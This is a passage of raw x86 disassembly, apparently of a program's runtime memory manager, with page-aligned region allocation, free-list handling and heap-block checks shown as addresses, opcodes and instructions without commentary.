  40161e:	8b 7c 24 08          	mov    0x8(%esp),%edi
  401622:	3b fb                	cmp    %ebx,%edi
  401624:	76 1e                	jbe    0x401644
  401626:	6a 04                	push   $0x4
  401628:	68 00 10 00 00       	push   $0x1000
  40162d:	2b fb                	sub    %ebx,%edi
  40162f:	57                   	push   %edi
  401630:	53                   	push   %ebx
  401631:	e8 26 fc ff ff       	call   0x40125c
  401636:	85 c0                	test   %eax,%eax
  401638:	75 0a                	jne    0x401644
  40163a:	8b 44 24 04          	mov    0x4(%esp),%eax
  40163e:	33 d2                	xor    %edx,%edx
  401640:	89 10                	mov    %edx,(%eax)
  401642:	eb 0a                	jmp    0x40164e
  401644:	8b 36                	mov    (%esi),%esi
  401646:	81 fe 3c b4 40 00    	cmp    $0x40b43c,%esi
  40164c:	75 bc                	jne    0x40160a
  40164e:	83 c4 0c             	add    $0xc,%esp
  401651:	5d                   	pop    %ebp
  401652:	5f                   	pop    %edi
  401653:	5e                   	pop    %esi
  401654:	5b                   	pop    %ebx
  401655:	c3                   	ret
  401656:	8b c0                	mov    %eax,%eax
  401658:	53                   	push   %ebx
  401659:	56                   	push   %esi
  40165a:	57                   	push   %edi
  40165b:	55                   	push   %ebp
  40165c:	51                   	push   %ecx
  40165d:	8b d8                	mov    %eax,%ebx
  40165f:	8b f3                	mov    %ebx,%esi
  401661:	81 c6 ff 0f 00 00    	add    $0xfff,%esi
  401667:	81 e6 00 f0 ff ff    	and    $0xfffff000,%esi
  40166d:	89 34 24             	mov    %esi,(%esp)
  401670:	8b eb                	mov    %ebx,%ebp
  401672:	03 ea                	add    %edx,%ebp
  401674:	81 e5 00 f0 ff ff    	and    $0xfffff000,%ebp
  40167a:	8b 04 24             	mov    (%esp),%eax
  40167d:	89 01                	mov    %eax,(%ecx)
  40167f:	8b c5                	mov    %ebp,%eax
  401681:	2b 04 24             	sub    (%esp),%eax
  401684:	89 41 04             	mov    %eax,0x4(%ecx)
  401687:	8b 35 3c b4 40 00    	mov    0x40b43c,%esi
  40168d:	eb 38                	jmp    0x4016c7
  40168f:	8b 5e 08             	mov    0x8(%esi),%ebx
  401692:	8b 7e 0c             	mov    0xc(%esi),%edi
  401695:	03 fb                	add    %ebx,%edi
  401697:	3b 1c 24             	cmp    (%esp),%ebx
  40169a:	73 03                	jae    0x40169f
  40169c:	8b 1c 24             	mov    (%esp),%ebx
  40169f:	3b ef                	cmp    %edi,%ebp
  4016a1:	73 02                	jae    0x4016a5
  4016a3:	8b fd                	mov    %ebp,%edi
  4016a5:	3b fb                	cmp    %ebx,%edi
  4016a7:	76 1c                	jbe    0x4016c5
  4016a9:	68 00 40 00 00       	push   $0x4000
  4016ae:	2b fb                	sub    %ebx,%edi
  4016b0:	57                   	push   %edi
  4016b1:	53                   	push   %ebx
  4016b2:	e8 ad fb ff ff       	call   0x401264
  4016b7:	85 c0                	test   %eax,%eax
  4016b9:	75 0a                	jne    0x4016c5
  4016bb:	c7 05 18 b4 40 00 02 	movl   $0x2,0x40b418
  4016c2:	00 00 00 
  4016c5:	8b 36                	mov    (%esi),%esi
  4016c7:	81 fe 3c b4 40 00    	cmp    $0x40b43c,%esi
  4016cd:	75 c0                	jne    0x40168f
  4016cf:	5a                   	pop    %edx
  4016d0:	5d                   	pop    %ebp
  4016d1:	5f                   	pop    %edi
  4016d2:	5e                   	pop    %esi
  4016d3:	5b                   	pop    %ebx
  4016d4:	c3                   	ret
  4016d5:	8d 40 00             	lea    0x0(%eax),%eax
  4016d8:	53                   	push   %ebx
  4016d9:	56                   	push   %esi
  4016da:	57                   	push   %edi
  4016db:	55                   	push   %ebp
  4016dc:	83 c4 f8             	add    $0xfffffff8,%esp
  4016df:	8b f2                	mov    %edx,%esi
  4016e1:	8b f8                	mov    %eax,%edi
  4016e3:	bd 4c b4 40 00       	mov    $0x40b44c,%ebp
  4016e8:	81 c7 ff 3f 00 00    	add    $0x3fff,%edi
  4016ee:	81 e7 00 c0 ff ff    	and    $0xffffc000,%edi
  4016f4:	8b 5d 00             	mov    0x0(%ebp),%ebx
  4016f7:	eb 33                	jmp    0x40172c
  4016f9:	3b 7b 0c             	cmp    0xc(%ebx),%edi
  4016fc:	7f 2c                	jg     0x40172a
  4016fe:	8b ce                	mov    %esi,%ecx
  401700:	8b d7                	mov    %edi,%edx
  401702:	8b 43 08             	mov    0x8(%ebx),%eax
  401705:	e8 ba fe ff ff       	call   0x4015c4
  40170a:	83 3e 00             	cmpl   $0x0,(%esi)
  40170d:	74 50                	je     0x40175f
  40170f:	8b 46 04             	mov    0x4(%esi),%eax
  401712:	01 43 08             	add    %eax,0x8(%ebx)
  401715:	8b 46 04             	mov    0x4(%esi),%eax
  401718:	29 43 0c             	sub    %eax,0xc(%ebx)
  40171b:	83 7b 0c 00          	cmpl   $0x0,0xc(%ebx)
  40171f:	75 3e                	jne    0x40175f
  401721:	8b c3                	mov    %ebx,%eax
  401723:	e8 ec fb ff ff       	call   0x401314
  401728:	eb 35                	jmp    0x40175f
  40172a:	8b 1b                	mov    (%ebx),%ebx
  40172c:	3b dd                	cmp    %ebp,%ebx
  40172e:	75 c9                	jne    0x4016f9
  401730:	8b d6                	mov    %esi,%edx
  401732:	8b c7                	mov    %edi,%eax
  401734:	e8 f7 fc ff ff       	call   0x401430
  401739:	83 3e 00             	cmpl   $0x0,(%esi)
  40173c:	74 21                	je     0x40175f
  40173e:	8b cc                	mov    %esp,%ecx
  401740:	8b d6                	mov    %esi,%edx
  401742:	8b c5                	mov    %ebp,%eax
  401744:	e8 e3 fb ff ff       	call   0x40132c
  401749:	83 3c 24 00          	cmpl   $0x0,(%esp)
  40174d:	75 a5                	jne    0x4016f4
  40174f:	8b cc                	mov    %esp,%ecx
  401751:	8b 56 04             	mov    0x4(%esi),%edx
  401754:	8b 06                	mov    (%esi),%eax
  401756:	e8 b1 fd ff ff       	call   0x40150c
  40175b:	33 c0                	xor    %eax,%eax
  40175d:	89 06                	mov    %eax,(%esi)
  40175f:	59                   	pop    %ecx
  401760:	5a                   	pop    %edx
  401761:	5d                   	pop    %ebp
  401762:	5f                   	pop    %edi
  401763:	5e                   	pop    %esi
  401764:	5b                   	pop    %ebx
  401765:	c3                   	ret
  401766:	8b c0                	mov    %eax,%eax
  401768:	53                   	push   %ebx
  401769:	56                   	push   %esi
  40176a:	57                   	push   %edi
  40176b:	55                   	push   %ebp
  40176c:	83 c4 ec             	add    $0xffffffec,%esp
  40176f:	89 0c 24             	mov    %ecx,(%esp)
  401772:	8b fa                	mov    %edx,%edi
  401774:	8b f0                	mov    %eax,%esi
  401776:	bd 4c b4 40 00       	mov    $0x40b44c,%ebp
  40177b:	81 c7 ff 3f 00 00    	add    $0x3fff,%edi
  401781:	81 e7 00 c0 ff ff    	and    $0xffffc000,%edi
  401787:	8b 5d 00             	mov    0x0(%ebp),%ebx
  40178a:	eb 02                	jmp    0x40178e
  40178c:	8b 1b                	mov    (%ebx),%ebx
  40178e:	3b dd                	cmp    %ebp,%ebx
  401790:	74 05                	je     0x401797
  401792:	3b 73 08             	cmp    0x8(%ebx),%esi
  401795:	75 f5                	jne    0x40178c
  401797:	3b 73 08             	cmp    0x8(%ebx),%esi
  40179a:	75 57                	jne    0x4017f3
  40179c:	3b 7b 0c             	cmp    0xc(%ebx),%edi
  40179f:	0f 8e 96 00 00 00    	jle    0x40183b
  4017a5:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  4017a9:	8b d7                	mov    %edi,%edx
  4017ab:	2b 53 0c             	sub    0xc(%ebx),%edx
  4017ae:	8b 43 08             	mov    0x8(%ebx),%eax
  4017b1:	03 43 0c             	add    0xc(%ebx),%eax
  4017b4:	e8 db fc ff ff       	call   0x401494
  4017b9:	83 7c 24 04 00       	cmpl   $0x0,0x4(%esp)
  4017be:	74 33                	je     0x4017f3
  4017c0:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  4017c4:	8d 54 24 04          	lea    0x4(%esp),%edx
  4017c8:	8b c5                	mov    %ebp,%eax
  4017ca:	e8 5d fb ff ff       	call   0x40132c
  4017cf:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%esp)
  4017d4:	75 b1                	jne    0x401787
  4017d6:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  4017da:	8b 54 24 08          	mov    0x8(%esp),%edx
  4017de:	8b 44 24 04          	mov    0x4(%esp),%eax
  4017e2:	e8 25 fd ff ff       	call   0x40150c
  4017e7:	8b 04 24             	mov    (%esp),%eax
  4017ea:	33 d2                	xor    %edx,%edx
  4017ec:	89 10                	mov    %edx,(%eax)
  4017ee:	e9 90 00 00 00       	jmp    0x401883
  4017f3:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  4017f7:	8b d7                	mov    %edi,%edx
  4017f9:	8b c6                	mov    %esi,%eax
  4017fb:	e8 94 fc ff ff       	call   0x401494
  401800:	83 7c 24 04 00       	cmpl   $0x0,0x4(%esp)
  401805:	74 34                	je     0x40183b
  401807:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  40180b:	8d 54 24 04          	lea    0x4(%esp),%edx
  40180f:	8b c5                	mov    %ebp,%eax
  401811:	e8 16 fb ff ff       	call   0x40132c
  401816:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%esp)
  40181b:	0f 85 66 ff ff ff    	jne    0x401787
  401821:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  401825:	8b 54 24 08          	mov    0x8(%esp),%edx
  401829:	8b 44 24 04          	mov    0x4(%esp),%eax
  40182d:	e8 da fc ff ff       	call   0x40150c
  401832:	8b 04 24             	mov    (%esp),%eax
  401835:	33 d2                	xor    %edx,%edx
  401837:	89 10                	mov    %edx,(%eax)
  401839:	eb 48                	jmp    0x401883
  40183b:	8b 6b 08             	mov    0x8(%ebx),%ebp
  40183e:	3b f5                	cmp    %ebp,%esi
  401840:	75 3a                	jne    0x40187c
  401842:	3b 7b 0c             	cmp    0xc(%ebx),%edi
  401845:	7f 35                	jg     0x40187c
  401847:	8b 0c 24             	mov    (%esp),%ecx
  40184a:	8b d7                	mov    %edi,%edx
  40184c:	8b c5                	mov    %ebp,%eax
  40184e:	e8 71 fd ff ff       	call   0x4015c4
  401853:	8b 04 24             	mov    (%esp),%eax
  401856:	83 38 00             	cmpl   $0x0,(%eax)
  401859:	74 28                	je     0x401883
  40185b:	8b 04 24             	mov    (%esp),%eax
  40185e:	8b 40 04             	mov    0x4(%eax),%eax
  401861:	01 43 08             	add    %eax,0x8(%ebx)
  401864:	8b 04 24             	mov    (%esp),%eax
  401867:	8b 40 04             	mov    0x4(%eax),%eax
  40186a:	29 43 0c             	sub    %eax,0xc(%ebx)
  40186d:	83 7b 0c 00          	cmpl   $0x0,0xc(%ebx)
  401871:	75 10                	jne    0x401883
  401873:	8b c3                	mov    %ebx,%eax
  401875:	e8 9a fa ff ff       	call   0x401314
  40187a:	eb 07                	jmp    0x401883
  40187c:	8b 04 24             	mov    (%esp),%eax
  40187f:	33 d2                	xor    %edx,%edx
  401881:	89 10                	mov    %edx,(%eax)
  401883:	83 c4 14             	add    $0x14,%esp
  401886:	5d                   	pop    %ebp
  401887:	5f                   	pop    %edi
  401888:	5e                   	pop    %esi
  401889:	5b                   	pop    %ebx
  40188a:	c3                   	ret
  40188b:	90                   	nop
  40188c:	53                   	push   %ebx
  40188d:	56                   	push   %esi
  40188e:	57                   	push   %edi
  40188f:	83 c4 ec             	add    $0xffffffec,%esp
  401892:	8b f9                	mov    %ecx,%edi
  401894:	89 14 24             	mov    %edx,(%esp)
  401897:	8d 98 ff 3f 00 00    	lea    0x3fff(%eax),%ebx
  40189d:	81 e3 00 c0 ff ff    	and    $0xffffc000,%ebx
  4018a3:	8b 34 24             	mov    (%esp),%esi
  4018a6:	03 f0                	add    %eax,%esi
  4018a8:	81 e6 00 c0 ff ff    	and    $0xffffc000,%esi
  4018ae:	3b de                	cmp    %esi,%ebx
  4018b0:	73 5b                	jae    0x40190d
  4018b2:	8b cf                	mov    %edi,%ecx
  4018b4:	8b d6                	mov    %esi,%edx
  4018b6:	2b d3                	sub    %ebx,%edx
  4018b8:	8b c3                	mov    %ebx,%eax
  4018ba:	e8 99 fd ff ff       	call   0x401658
  4018bf:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  4018c3:	8b d7                	mov    %edi,%edx
  4018c5:	b8 4c b4 40 00       	mov    $0x40b44c,%eax
  4018ca:	e8 5d fa ff ff       	call   0x40132c
  4018cf:	8b 5c 24 04          	mov    0x4(%esp),%ebx
  4018d3:	85 db                	test   %ebx,%ebx
  4018d5:	74 1f                	je     0x4018f6
  4018d7:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  4018db:	8b 54 24 08          	mov    0x8(%esp),%edx
  4018df:	8b c3                	mov    %ebx,%eax
  4018e1:	e8 26 fc ff ff       	call   0x40150c
  4018e6:	8b 44 24 0c          	mov    0xc(%esp),%eax
  4018ea:	89 44 24 04          	mov    %eax,0x4(%esp)
  4018ee:	8b 44 24 10          	mov    0x10(%esp),%eax
  4018f2:	89 44 24 08          	mov    %eax,0x8(%esp)
  4018f6:	83 7c 24 04 00       	cmpl   $0x0,0x4(%esp)
  4018fb:	74 14                	je     0x401911
  4018fd:	8d 54 24 04          	lea    0x4(%esp),%edx
  401901:	b8 4c b4 40 00       	mov    $0x40b44c,%eax
  401906:	e8 95 fa ff ff       	call   0x4013a0
  40190b:	eb 04                	jmp    0x401911
  40190d:	33 c0                	xor    %eax,%eax
  40190f:	89 07                	mov    %eax,(%edi)
  401911:	83 c4 14             	add    $0x14,%esp
  401914:	5f                   	pop    %edi
  401915:	5e                   	pop    %esi
  401916:	5b                   	pop    %ebx
  401917:	c3                   	ret
  401918:	55                   	push   %ebp
  401919:	8b ec                	mov    %esp,%ebp
  40191b:	33 d2                	xor    %edx,%edx
  40191d:	55                   	push   %ebp
  40191e:	68 ce 19 40 00       	push   $0x4019ce
  401923:	64 ff 32             	push   %fs:(%edx)
  401926:	64 89 22             	mov    %esp,%fs:(%edx)
  401929:	68 1c b4 40 00       	push   $0x40b41c
  40192e:	e8 39 f9 ff ff       	call   0x40126c
  401933:	80 3d 32 b0 40 00 00 	cmpb   $0x0,0x40b032
  40193a:	74 0a                	je     0x401946
  40193c:	68 1c b4 40 00       	push   $0x40b41c
  401941:	e8 2e f9 ff ff       	call   0x401274
  401946:	b8 3c b4 40 00       	mov    $0x40b43c,%eax
  40194b:	e8 8c f9 ff ff       	call   0x4012dc
  401950:	b8 4c b4 40 00       	mov    $0x40b44c,%eax
  401955:	e8 82 f9 ff ff       	call   0x4012dc
  40195a:	b8 78 b4 40 00       	mov    $0x40b478,%eax
  40195f:	e8 78 f9 ff ff       	call   0x4012dc
  401964:	68 f8 0f 00 00       	push   $0xff8
  401969:	6a 00                	push   $0x0
  40196b:	e8 dc f8 ff ff       	call   0x40124c
  401970:	a3 74 b4 40 00       	mov    %eax,0x40b474
  401975:	83 3d 74 b4 40 00 00 	cmpl   $0x0,0x40b474
  40197c:	74 2f                	je     0x4019ad
  40197e:	b8 03 00 00 00       	mov    $0x3,%eax
  401983:	8b 15 74 b4 40 00    	mov    0x40b474,%edx
  401989:	33 c9                	xor    %ecx,%ecx
  40198b:	89 4c 82 f4          	mov    %ecx,-0xc(%edx,%eax,4)
  40198f:	40                   	inc    %eax
  401990:	3d 01 04 00 00       	cmp    $0x401,%eax
  401995:	75 ec                	jne    0x401983
  401997:	b8 5c b4 40 00       	mov    $0x40b45c,%eax
  40199c:	89 40 04             	mov    %eax,0x4(%eax)
  40199f:	89 00                	mov    %eax,(%eax)
  4019a1:	a3 68 b4 40 00       	mov    %eax,0x40b468
  4019a6:	c6 05 15 b4 40 00 01 	movb   $0x1,0x40b415
  4019ad:	33 c0                	xor    %eax,%eax
  4019af:	5a                   	pop    %edx
  4019b0:	59                   	pop    %ecx
  4019b1:	59                   	pop    %ecx
  4019b2:	64 89 10             	mov    %edx,%fs:(%eax)
  4019b5:	68 d5 19 40 00       	push   $0x4019d5
  4019ba:	80 3d 32 b0 40 00 00 	cmpb   $0x0,0x40b032
  4019c1:	74 0a                	je     0x4019cd
  4019c3:	68 1c b4 40 00       	push   $0x40b41c
  4019c8:	e8 af f8 ff ff       	call   0x40127c
  4019cd:	c3                   	ret
  4019ce:	e9 29 14 00 00       	jmp    0x402dfc
  4019d3:	eb e5                	jmp    0x4019ba
  4019d5:	a0 15 b4 40 00       	mov    0x40b415,%al
  4019da:	5d                   	pop    %ebp
  4019db:	c3                   	ret
  4019dc:	55                   	push   %ebp
  4019dd:	8b ec                	mov    %esp,%ebp
  4019df:	53                   	push   %ebx
  4019e0:	80 3d 15 b4 40 00 00 	cmpb   $0x0,0x40b415
  4019e7:	0f 84 ce 00 00 00    	je     0x401abb
  4019ed:	33 d2                	xor    %edx,%edx
  4019ef:	55                   	push   %ebp
  4019f0:	68 b4 1a 40 00       	push   $0x401ab4
  4019f5:	64 ff 32             	push   %fs:(%edx)
  4019f8:	64 89 22             	mov    %esp,%fs:(%edx)
  4019fb:	80 3d 32 b0 40 00 00 	cmpb   $0x0,0x40b032
  401a02:	74 0a                	je     0x401a0e
  401a04:	68 1c b4 40 00       	push   $0x40b41c
  401a09:	e8 66 f8 ff ff       	call   0x401274
  401a0e:	c6 05 15 b4 40 00 00 	movb   $0x0,0x40b415
  401a15:	a1 74 b4 40 00       	mov    0x40b474,%eax
  401a1a:	50                   	push   %eax
  401a1b:	e8 34 f8 ff ff       	call   0x401254
  401a20:	33 c0                	xor    %eax,%eax
  401a22:	a3 74 b4 40 00       	mov    %eax,0x40b474
  401a27:	8b 1d 3c b4 40 00    	mov    0x40b43c,%ebx
  401a2d:	eb 12                	jmp    0x401a41
  401a2f:	68 00 80 00 00       	push   $0x8000
  401a34:	6a 00                	push   $0x0
  401a36:	8b 43 08             	mov    0x8(%ebx),%eax
  401a39:	50                   	push   %eax
  401a3a:	e8 25 f8 ff ff       	call   0x401264
  401a3f:	8b 1b                	mov    (%ebx),%ebx
  401a41:	81 fb 3c b4 40 00    	cmp    $0x40b43c,%ebx
  401a47:	75 e6                	jne    0x401a2f
  401a49:	b8 3c b4 40 00       	mov    $0x40b43c,%eax
  401a4e:	e8 89 f8 ff ff       	call   0x4012dc
  401a53:	b8 4c b4 40 00       	mov    $0x40b44c,%eax
  401a58:	e8 7f f8 ff ff       	call   0x4012dc
  401a5d:	b8 78 b4 40 00       	mov    $0x40b478,%eax
  401a62:	e8 75 f8 ff ff       	call   0x4012dc
  401a67:	a1 34 b4 40 00       	mov    0x40b434,%eax
  401a6c:	85 c0                	test   %eax,%eax
  401a6e:	74 17                	je     0x401a87
  401a70:	8b 10                	mov    (%eax),%edx
  401a72:	89 15 34 b4 40 00    	mov    %edx,0x40b434
  401a78:	50                   	push   %eax
  401a79:	e8 d6 f7 ff ff       	call   0x401254
  401a7e:	a1 34 b4 40 00       	mov    0x40b434,%eax
  401a83:	85 c0                	test   %eax,%eax
  401a85:	75 e9                	jne    0x401a70
  401a87:	64 8f 05 00 00 00 00 	pop    %fs:0x0
  401a8e:	83 c4 08             	add    $0x8,%esp
  401a91:	68 bb 1a 40 00       	push   $0x401abb
  401a96:	80 3d 32 b0 40 00 00 	cmpb   $0x0,0x40b032
  401a9d:	74 0a                	je     0x401aa9
  401a9f:	68 1c b4 40 00       	push   $0x40b41c
  401aa4:	e8 d3 f7 ff ff       	call   0x40127c
  401aa9:	68 1c b4 40 00       	push   $0x40b41c
  401aae:	e8 d1 f7 ff ff       	call   0x401284
  401ab3:	c3                   	ret
  401ab4:	e9 43 13 00 00       	jmp    0x402dfc
  401ab9:	eb db                	jmp    0x401a96
  401abb:	5b                   	pop    %ebx
  401abc:	5d                   	pop    %ebp
  401abd:	c3                   	ret
  401abe:	8b c0                	mov    %eax,%eax
  401ac0:	53                   	push   %ebx
  401ac1:	3b 05 68 b4 40 00    	cmp    0x40b468,%eax
  401ac7:	75 09                	jne    0x401ad2
  401ac9:	8b 50 04             	mov    0x4(%eax),%edx
  401acc:	89 15 68 b4 40 00    	mov    %edx,0x40b468
  401ad2:	8b 50 04             	mov    0x4(%eax),%edx
  401ad5:	8b 48 08             	mov    0x8(%eax),%ecx
  401ad8:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  401ade:	7f 2a                	jg     0x401b0a
  401ae0:	3b c2                	cmp    %edx,%eax
  401ae2:	75 10                	jne    0x401af4
  401ae4:	c1 e9 02             	shr    $0x2,%ecx
  401ae7:	a1 74 b4 40 00       	mov    0x40b474,%eax
  401aec:	33 d2                	xor    %edx,%edx
  401aee:	89 54 88 f4          	mov    %edx,-0xc(%eax,%ecx,4)
  401af2:	eb 1d                	jmp    0x401b11
  401af4:	c1 e9 02             	shr    $0x2,%ecx
  401af7:	8b 1d 74 b4 40 00    	mov    0x40b474,%ebx
  401afd:	89 54 8b f4          	mov    %edx,-0xc(%ebx,%ecx,4)
  401b01:	8b 00                	mov    (%eax),%eax
  401b03:	89 02                	mov    %eax,(%edx)
  401b05:	89 50 04             	mov    %edx,0x4(%eax)
  401b08:	5b                   	pop    %ebx
  401b09:	c3                   	ret
  401b0a:	8b 00                	mov    (%eax),%eax
  401b0c:	89 02                	mov    %eax,(%edx)
  401b0e:	89 50 04             	mov    %edx,0x4(%eax)
  401b11:	5b                   	pop    %ebx
  401b12:	c3                   	ret
  401b13:	90                   	nop
  401b14:	8b 15 78 b4 40 00    	mov    0x40b478,%edx
  401b1a:	eb 10                	jmp    0x401b2c
  401b1c:	8b 4a 08             	mov    0x8(%edx),%ecx
  401b1f:	3b c1                	cmp    %ecx,%eax
  401b21:	72 07                	jb     0x401b2a
  401b23:	03 4a 0c             	add    0xc(%edx),%ecx
  401b26:	3b c1                	cmp    %ecx,%eax
  401b28:	72 16                	jb     0x401b40
  401b2a:	8b 12                	mov    (%edx),%edx
  401b2c:	81 fa 78 b4 40 00    	cmp    $0x40b478,%edx
  401b32:	75 e8                	jne    0x401b1c
  401b34:	c7 05 18 b4 40 00 03 	movl   $0x3,0x40b418
  401b3b:	00 00 00 
  401b3e:	33 d2                	xor    %edx,%edx
  401b40:	8b c2                	mov    %edx,%eax
  401b42:	c3                   	ret
  401b43:	90                   	nop
  401b44:	53                   	push   %ebx
  401b45:	8b ca                	mov    %edx,%ecx
  401b47:	83 e9 04             	sub    $0x4,%ecx
  401b4a:	8d 1c 01             	lea    (%ecx,%eax,1),%ebx
  401b4d:	83 fa 10             	cmp    $0x10,%edx
  401b50:	7c 0f                	jl     0x401b61
  401b52:	c7 03 07 00 00 80    	movl   $0x80000007,(%ebx)
  401b58:	8b d1                	mov    %ecx,%edx
  401b5a:	e8 a1 01 00 00       	call   0x401d00
  401b5f:	5b                   	pop    %ebx
  401b60:	c3                   	ret
  401b61:	83 fa 04             	cmp    $0x4,%edx
  401b64:	7c 0c                	jl     0x401b72
  401b66:	8b ca                	mov    %edx,%ecx
  401b68:	81 c9 02 00 00 80    	or     $0x80000002,%ecx
  401b6e:	89 08                	mov    %ecx,(%eax)
  401b70:	89 0b                	mov    %ecx,(%ebx)
  401b72:	5b                   	pop    %ebx
  401b73:	c3                   	ret
  401b74:	ff 05 fc b3 40 00    	incl   0x40b3fc
  401b7a:	8b d0                	mov    %eax,%edx
  401b7c:	83 ea 04             	sub    $0x4,%edx
  401b7f:	8b 12                	mov    (%edx),%edx
  401b81:	81 e2 fc ff ff 7f    	and    $0x7ffffffc,%edx
  401b87:	83 ea 04             	sub    $0x4,%edx
  401b8a:	01 15 00 b4 40 00    	add    %edx,0x40b400
  401b90:	e8 c7 05 00 00       	call   0x40215c
  401b95:	c3                   	ret
  401b96:	8b c0                	mov    %eax,%eax
  401b98:	83 fa 0c             	cmp    $0xc,%edx
  401b9b:	7c 0e                	jl     0x401bab
  401b9d:	83 ca 02             	or     $0x2,%edx
  401ba0:	89 10                	mov    %edx,(%eax)
  401ba2:	83 c0 04             	add    $0x4,%eax
  401ba5:	e8 ca ff ff ff       	call   0x401b74
  401baa:	c3                   	ret
  401bab:	83 fa 04             	cmp    $0x4,%edx
  401bae:	7c 0a                	jl     0x401bba
  401bb0:	8b ca                	mov    %edx,%ecx
  401bb2:	81 c9 02 00 00 80    	or     $0x80000002,%ecx
  401bb8:	89 08                	mov    %ecx,(%eax)
  401bba:	03 c2                	add    %edx,%eax
  401bbc:	83 20 fe             	andl   $0xfffffffe,(%eax)
  401bbf:	c3                   	ret
  401bc0:	53                   	push   %ebx
  401bc1:	56                   	push   %esi
  401bc2:	8b d0                	mov    %eax,%edx
  401bc4:	83 ea 04             	sub    $0x4,%edx
  401bc7:	8b 12                	mov    (%edx),%edx
  401bc9:	8b ca                	mov    %edx,%ecx
  401bcb:	81 e1 02 00 00 80    	and    $0x80000002,%ecx
  401bd1:	81 f9 02 00 00 80    	cmp    $0x80000002,%ecx
  401bd7:	74 0a                	je     0x401be3
  401bd9:	c7 05 18 b4 40 00 04 	movl   $0x4,0x40b418
  401be0:	00 00 00 
  401be3:	8b da                	mov    %edx,%ebx
  401be5:	81 e3 fc ff ff 7f    	and    $0x7ffffffc,%ebx
  401beb:	2b c3                	sub    %ebx,%eax
  401bed:	8b c8                	mov    %eax,%ecx
  401bef:	33 11                	xor    (%ecx),%edx
  401bf1:	f7 c2 fe ff ff ff    	test   $0xfffffffe,%edx
  401bf7:	74 0a                	je     0x401c03
  401bf9:	c7 05 18 b4 40 00 05 	movl   $0x5,0x40b418
  401c00:	00 00 00 
  401c03:	f6 01 01             	testb  $0x1,(%ecx)
  401c06:	74 20                	je     0x401c28
  401c08:	8b d0                	mov    %eax,%edx
  401c0a:	83 ea 0c             	sub    $0xc,%edx
  401c0d:	8b 72 08             	mov    0x8(%edx),%esi
  401c10:	2b c6                	sub    %esi,%eax
  401c12:	3b 70 08             	cmp    0x8(%eax),%esi
  401c15:	74 0a                	je     0x401c21
  401c17:	c7 05 18 b4 40 00 06 	movl   $0x6,0x40b418
  401c1e:	00 00 00 
  401c21:	e8 9a fe ff ff       	call   0x401ac0
  401c26:	03 de                	add    %esi,%ebx
  401c28:	8b c3                	mov    %ebx,%eax
  401c2a:	5e                   	pop    %esi
  401c2b:	5b                   	pop    %ebx
  401c2c:	c3                   	ret
  401c2d:	8d 40 00             	lea    0x0(%eax),%eax
  401c30:	53                   	push   %ebx
  401c31:	56                   	push   %esi
  401c32:	57                   	push   %edi
  401c33:	8b d8                	mov    %eax,%ebx
  401c35:	33 ff                	xor    %edi,%edi
  401c37:	8b 03                	mov    (%ebx),%eax
  401c39:	a9 00 00 00 80       	test   $0x80000000,%eax
  401c3e:	74 0b                	je     0x401c4b
  401c40:	25 fc ff ff 7f       	and    $0x7ffffffc,%eax
  401c45:	03 f8                	add    %eax,%edi
  401c47:	03 d8                	add    %eax,%ebx
  401c49:	8b 03                	mov    (%ebx),%eax
  401c4b:	a8 02                	test   $0x2,%al
  401c4d:	75 13                	jne    0x401c62
  401c4f:	8b f3                	mov    %ebx,%esi
  401c51:	8b c6                	mov    %esi,%eax
  401c53:	e8 68 fe ff ff       	call   0x401ac0
  401c58:	8b 46 08             	mov    0x8(%esi),%eax
  401c5b:	03 f8                	add    %eax,%edi
  401c5d:	03 d8                	add    %eax,%ebx
  401c5f:	83 23 fe             	andl   $0xfffffffe,(%ebx)
  401c62:	8b c7                	mov    %edi,%eax
  401c64:	5f                   	pop    %edi
  401c65:	5e                   	pop    %esi
  401c66:	5b                   	pop    %ebx
  401c67:	c3                   	ret
  401c68:	53                   	push   %ebx
  401c69:	56                   	push   %esi
  401c6a:	57                   	push   %edi
  401c6b:	55                   	push   %ebp
  401c6c:	83 c4 f8             	add    $0xfffffff8,%esp
  401c6f:	8b fa                	mov    %edx,%edi
  401c71:	8b f0                	mov    %eax,%esi
  401c73:	8b c6                	mov    %esi,%eax
  401c75:	e8 9a fe ff ff       	call   0x401b14
  401c7a:	8b d8                	mov    %eax,%ebx
  401c7c:	8b 6b 08             	mov    0x8(%ebx),%ebp
  401c7f:	8b c5                	mov    %ebp,%eax
  401c81:	03 43 0c             	add    0xc(%ebx),%eax
  401c84:	8b d0                	mov    %eax,%edx
  401c86:	8d 0c 37             	lea    (%edi,%esi,1),%ecx
  401c89:	2b d1                	sub    %ecx,%edx
  401c8b:	83 fa 0c             	cmp    $0xc,%edx
  401c8e:	7f 04                	jg     0x401c94
  401c90:	8b f8                	mov    %eax,%edi
  401c92:	2b fe                	sub    %esi,%edi
  401c94:	8b c6                	mov    %esi,%eax
  401c96:	2b c5                	sub    %ebp,%eax
  401c98:	83 f8 0c             	cmp    $0xc,%eax
  401c9b:	7d 12                	jge    0x401caf
  401c9d:	8b cc                	mov    %esp,%ecx
  401c9f:	8b d6                	mov    %esi,%edx
  401ca1:	2b 53 08             	sub    0x8(%ebx),%edx
  401ca4:	03 d7                	add    %edi,%edx
  401ca6:	8b c5                	mov    %ebp,%eax
  401ca8:	e8 df fb ff ff       	call   0x40188c
  401cad:	eb 0f                	jmp    0x401cbe
  401caf:	8b cc                	mov    %esp,%ecx
  401cb1:	8b d7                	mov    %edi,%edx
  401cb3:	83 ea 04             	sub    $0x4,%edx
  401cb6:	8d 46 04             	lea    0x4(%esi),%eax
  401cb9:	e8 ce fb ff ff       	call   0x40188c
  401cbe:	8b 2c 24             	mov    (%esp),%ebp
  401cc1:	85 ed                	test   %ebp,%ebp
  401cc3:	75 04                	jne    0x401cc9
  401cc5:	33 c0                	xor    %eax,%eax
  401cc7:	eb 30                	jmp    0x401cf9
  401cc9:	8b d5                	mov    %ebp,%edx
  401ccb:	2b d6                	sub    %esi,%edx
  401ccd:	8b c6                	mov    %esi,%eax
  401ccf:	e8 70 fe ff ff       	call   0x401b44
  401cd4:	8b c5                	mov    %ebp,%eax
